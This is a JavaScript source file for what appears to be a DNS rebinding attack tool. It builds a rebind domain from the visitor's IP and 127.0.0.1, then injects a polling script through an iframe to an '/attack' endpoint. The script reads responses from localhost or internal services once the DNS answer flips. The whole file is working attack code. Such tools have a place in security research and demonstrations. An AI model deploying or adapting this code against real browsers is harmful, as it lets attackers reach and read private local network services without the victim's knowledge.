var oReq = new XMLHttpRequest();
oReq.addEventListener("load", reqListener);
oReq.open("GET", "/myip");
oReq.send();

function reqListener() {
  myip = this.responseText;

  var ip = myip.replace(/\./g,'-',0)
  var id = Math.random().toString(36).substr(2, 9)

  document.getElementById('rebinddomain').value = document.domain.replace('dnsrebindtool',`${id}.${ip}.127-0-0-1.rebind`)

  document.getElementById('script').value = `
  var start = Date.now()

  var interval = setInterval(function(){
    var xhr = new XMLHttpRequest()
    xhr.open('GET', '//' + $REBIND_DOMAIN, false)

    xhr.send()

    if(xhr.status == 200){
      document.body.innerHTML = (Date.now() - start)/1000
      document.body.innerHTML += xhr.responseText
      clearInterval(interval)
      return
    }
  }, 200)
  `
}

function setupIframe(){
  var rebind_domain = document.getElementById('rebinddomain').value
  var script = document.getElementById('script').value.replace(new RegExp(/\$REBIND_DOMAIN/, 'g'),`"${rebind_domain}"` )
  document.getElementById("iframe").src = `//${rebind_domain}/attack?script=${btoa(script)}`
}
